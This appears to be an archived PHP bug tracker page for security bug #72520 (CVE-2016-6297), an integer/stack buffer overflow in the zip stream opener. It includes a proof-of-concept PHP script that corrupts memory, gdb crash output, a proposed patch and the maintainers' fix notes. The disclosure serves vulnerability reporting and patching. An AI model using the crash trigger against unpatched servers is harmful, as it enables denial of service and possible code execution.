@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='Zip Related Bug #72520 - RDF' href='rss/bug.php?id=72520'>
+        <link rel='alternate' type='application/rss+xml' title='Zip Related Bug #72520 - RSS 2.0' href='rss/bug.php?id=72520&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #72520 :: Stack-based buffer overflow vulnerability in php_stream_zip_opener</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=72520">Sec Bug</a>&nbsp;#72520</th>
+            <td id="summary" colspan="5">Stack-based buffer overflow vulnerability in php_stream_zip_opener</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-06-30 06:55 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-07-25 15:21 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>loianhtuan &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=Zip+Related">Zip Related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>7.1Git-2016-06-30 (Git)</td>
+            <th class="details">OS:</th>
+            <td></td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6297" target="_blank">2016-6297</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=72520&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=72520&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=72520&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1467269724">&nbsp;</a><strong>[2016-06-30 06:55 UTC] loianhtuan &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+When open a zip stream, php_stream_zip_opener failed to check the path_len that is vulnerable to integer overflow, later it is used to calculate the length of memcpy, leads to buffer overflow and memory corruption.
+
+&lt;snippet ext/zip/zip_stream.c:289&gt;
+	fragment_len = strlen(fragment);
+
+	if (fragment_len &lt; 1) {
+		return NULL;
+	}
+	path_len = strlen(path); //path_len can be negative
+	if (path_len &gt;= MAXPATHLEN || mode[0] != 'r') {
+		return NULL;
+	}
+
+	memcpy(file_dirname, path, path_len - fragment_len); //(path_len - fragment_len) can be controlled
+&lt;/snippet&gt;
+
+If php is compiled without stack cookie or attacker somehow leaked the stackcookie value then arbitrary code execution is possible.
+
+
+
+Test script:
+---------------
+&lt;?php
+ini_set('memory_limit',-1);
+$fragment_len = 0x7fffffff-1; //minus '#'
+$overflow_len = 0x1050;
+$fp = fopen('zip://'.str_repeat('B',$overflow_len).'#'.str_repeat('A',$fragment_len),'r');
+?&gt;
+
+Expected result:
+----------------
+no crash
+
+Actual result:
+--------------
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x4242424242424243 ('CBBBBBBB')
+RBX: 0x1
+RCX: 0x11c7260 --&gt; 0x0
+RDX: 0x2000 ('')
+RSI: 0x2000 ('')
+RDI: 0x4242424242424243 ('CBBBBBBB')
+RBP: 0x7fffffff99b0 --&gt; 0x7fffffff99f0 --&gt; 0x7fffffff9a40 --&gt; 0x7fffffff9a70 --&gt; 0x7fffffff9ab0 --&gt; 0x7fffffffab60 ('B' &lt;repeats 16 times&gt;, &quot;\001&quot;)
+RSP: 0x7fffffff99b0 --&gt; 0x7fffffff99f0 --&gt; 0x7fffffff9a40 --&gt; 0x7fffffff9a70 --&gt; 0x7fffffff9ab0 --&gt; 0x7fffffffab60 ('B' &lt;repeats 16 times&gt;, &quot;\001&quot;)
+RIP: 0x7a074d (&lt;_hash_string+81&gt;:       movzx  eax,BYTE PTR [rax])
+R8 : 0x11c72e0 --&gt; 0x0
+R9 : 0x79 ('y')
+R10: 0x7fffffff9740 --&gt; 0x0
+R11: 0x7ffff6df3101 (&lt;__GI___libc_realloc+769&gt;: xor    eax,0xfe92a)
+R12: 0x424250 (&lt;_start&gt;:        xor    ebp,ebp)
+R13: 0x7fffffffe6c0 --&gt; 0x2
+R14: 0x7ffff6814030 --&gt; 0x7ffff68802c0 --&gt; 0x899d67 (&lt;ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER&gt;:  push   rbp)
+
+R15: 0x7ffff68802c0 --&gt; 0x899d67 (&lt;ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER&gt;:     push   rbp)
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7a0740 &lt;_hash_string+68&gt;:  mov    WORD PTR [rbp-0x2],ax
+   0x7a0744 &lt;_hash_string+72&gt;:  add    QWORD PTR [rbp-0x18],0x1
+   0x7a0749 &lt;_hash_string+77&gt;:  mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x7a074d &lt;_hash_string+81&gt;:  movzx  eax,BYTE PTR [rax]
+   0x7a0750 &lt;_hash_string+84&gt;:  test   al,al
+   0x7a0752 &lt;_hash_string+86&gt;:  jne    0x7a0720 &lt;_hash_string+36&gt;
+   0x7a0754 &lt;_hash_string+88&gt;:  movzx  eax,WORD PTR [rbp-0x2]
+   0x7a0758 &lt;_hash_string+92&gt;:  pop    rbp
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffff99b0 --&gt; 0x7fffffff99f0 --&gt; 0x7fffffff9a40 --&gt; 0x7fffffff9a70 --&gt; 0x7fffffff9ab0 --&gt; 0x7fffffffab60 ('B' &lt;repeats 16 times&gt;, &quot;\001&quot;)
+0008| 0x7fffffff99b8 --&gt; 0x7a0aac (&lt;_zip_hash_lookup+95&gt;:       mov    WORD PTR [rbp-0xa],ax)
+0016| 0x7fffffff99c0 --&gt; 0x11c7260 --&gt; 0x0
+0024| 0x7fffffff99c8 --&gt; 0x11c7250 --&gt; 0x11c57a0 --&gt; 0x0
+0032| 0x7fffffff99d0 (&quot;CBBBBBBB&quot;)
+0040| 0x7fffffff99d8 --&gt; 0x1117b00 --&gt; 0x7ffff7122000 (MemError)
+0048| 0x7fffffff99e0 --&gt; 0x0
+0056| 0x7fffffff99e8 --&gt; 0x7fffffff9a90 (&quot;CBBBBBBBPr\034\001&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000007a074d in _hash_string (
+    name=0x4242424242424243 &lt;error: Cannot access memory at address 0x4242424242424243&gt;, size=0x2000)
+    at /root/php-src/ext/zip/lib/zip_hash.c:113
+113         while (*name != 0) {
+gdb-peda$ q
+
+==============================================================================
+&lt;&lt;&lt;&lt; backtrace before memory corruption, break before memcpy  &gt;&gt;&gt;&gt;
+299             memcpy(file_dirname, path, path_len - fragment_len);
+gdb-peda$ list
+294             path_len = strlen(path);
+295             if (path_len &gt;= MAXPATHLEN || mode[0] != 'r') {
+296                     return NULL;
+297             }
+298
+299             memcpy(file_dirname, path, path_len - fragment_len);
+300             file_dirname[path_len - fragment_len] = '\0';
+301
+302             file_basename = php_basename(path, path_len - fragment_len, NULL, 0);
+303             fragment++;
+gdb-peda$ bt
+#0  php_stream_zip_opener (wrapper=0x108e550 &lt;php_stream_zip_wrapper&gt;,
+    path=0x7ffef620001e 'B' &lt;repeats 200 times&gt;..., mode=0x7ffff6858bd8 &quot;r&quot;, options=0x0,
+    opened_path=0x0, context=0x7ffff6858c40, __php_stream_call_depth=0x1,
+    __zend_filename=0xd58a00 &quot;/root/php-src/main/streams/streams.c&quot;, __zend_lineno=0x80e,
+    __zend_orig_filename=0xd3a5b0 &quot;/root/php-src/ext/standard/file.c&quot;, __zend_orig_lineno=0x366)
+    at /root/php-src/ext/zip/zip_stream.c:299
+#1  0x00000000007cc57f in _php_stream_open_wrapper_ex (
+    path=0x7ffef6200018 &quot;zip://&quot;, 'B' &lt;repeats 194 times&gt;..., mode=0x7ffff6858bd8 &quot;r&quot;, options=0x8,
+    opened_path=0x0, context=0x7ffff6858c40, __php_stream_call_depth=0x0,
+    __zend_filename=0xd3a5b0 &quot;/root/php-src/ext/standard/file.c&quot;, __zend_lineno=0x366,
+    __zend_orig_filename=0x0, __zend_orig_lineno=0x0) at /root/php-src/main/streams/streams.c:2060
+#2  0x000000000070f0d9 in php_if_fopen (execute_data=0x7ffff6814180, return_value=0x7ffff6814160)
+    at /root/php-src/ext/standard/file.c:870
+#3  0x00000000006564b9 in phar_fopen (execute_data=0x7ffff6814180, return_value=0x7ffff6814160)
+    at /root/php-src/ext/phar/func_interceptors.c:427
+#4  0x0000000000899df0 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER ()
+    at /root/php-src/Zend/zend_vm_execute.h:679
+#5  0x00000000008994fd in execute_ex (ex=0x7ffff6814030) at /root/php-src/Zend/zend_vm_execute.h:429
+#6  0x000000000089960f in zend_execute (op_array=0x7ffff687f000, return_value=0x0)
+    at /root/php-src/Zend/zend_vm_execute.h:474
+#7  0x000000000083b72f in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3)
+    at /root/php-src/Zend/zend.c:1441
+#8  0x00000000007ac454 in php_execute_script (primary_file=0x7fffffffe310)
+    at /root/php-src/main/main.c:2532
+#9  0x00000000009158b6 in do_cli (argc=0x2, argv=0x10bc9f0) at /root/php-src/sapi/cli/php_cli.c:990
+#10 0x0000000000916875 in main (argc=0x2, argv=0x10bc9f0) at /root/php-src/sapi/cli/php_cli.c:1378
+#11 0x00007ffff6d91f45 in __libc_start_main (main=0x9161e1 &lt;main&gt;, argc=0x2, argv=0x7fffffffe6c8,
+    init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe6b8)
+    at libc-start.c:287
+#12 0x0000000000424279 in _start ()
+gdb-peda$
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=72520'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=72520'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1467269843">&nbsp;</a><strong>[2016-06-30 06:57 UTC] loianhtuan &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Not sure if the proposed patch file is uploaded, so I'm pasting here:
+
+diff --git a/ext/zip/zip_stream.c b/ext/zip/zip_stream.c
+index 3d5b002..dea0152 100644
+--- a/ext/zip/zip_stream.c
++++ b/ext/zip/zip_stream.c
+@@ -123,11 +123,11 @@ static int php_zip_ops_stat(php_stream *stream, php_stream_statbuf *ssb) /* {{{
+ {
+        struct zip_stat sb;
+        const char *path = stream-&gt;orig_path;
+-       int path_len = strlen(stream-&gt;orig_path);
++       size_t path_len = strlen(stream-&gt;orig_path);
+        char file_dirname[MAXPATHLEN];
+        struct zip *za;
+        char *fragment;
+-       int fragment_len;
++       size_t fragment_len;
+        int err;
+        zend_string *file_basename;
+
+@@ -263,7 +263,7 @@ php_stream *php_stream_zip_opener(php_stream_wrapper *wrapper,
+                                                                                        zend_string **opened_path,
+                                                                                        php_stream_context *context STREAMS_DC)
+ {
+-       int path_len;
++       size_t path_len;
+
+        zend_string *file_basename;
+        char file_dirname[MAXPATHLEN];
+@@ -271,7 +271,7 @@ php_stream *php_stream_zip_opener(php_stream_wrapper *wrapper,
+        struct zip *za;
+        struct zip_file *zf = NULL;
+        char *fragment;
+-       int fragment_len;
++       size_t fragment_len;
+        int err;
+
+        php_stream *stream = NULL;
+</pre>
+</div><div class='comment type_log' ><a name="1468386388">&nbsp;</a><strong>[2016-07-13 05:06 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1468386388">&nbsp;</a><strong>[2016-07-13 05:06 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Fix in security repo as 81406c0c1d45f75fcc7972ed974d2597abb0b9e9 and in <a href="https://gist.github.com/f4bc6912ba9c2144f83032ca769f7d2b" rel="nofollow">https://gist.github.com/f4bc6912ba9c2144f83032ca769f7d2b</a>
+</pre>
+</div><div class='comment type_comment' ><a name="1468463466">&nbsp;</a><strong>[2016-07-14 02:31 UTC] loianhtuan &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Thanks Stas, can you request a CVE for me please?
+</pre>
+</div><div class='comment type_log' ><a name="1468918846">&nbsp;</a><strong>[2016-07-19 09:00 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_comment' ><a name="1468918846">&nbsp;</a><strong>[2016-07-19 09:00 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>The fix for this bug has been committed.
+
+Snapshots of the sources are packaged every three hours; this change
+will be in the next snapshot. You can grab the snapshot at
+<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.
+
+ For Windows:
+
+<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
+ 
+Thank you for the report, and for helping us make PHP better.
+
+
+</pre>
+</div><div class='comment type_log' ><a name="1469460090">&nbsp;</a><strong>[2016-07-25 15:21 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2016-6297</span>
+</div></div></div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
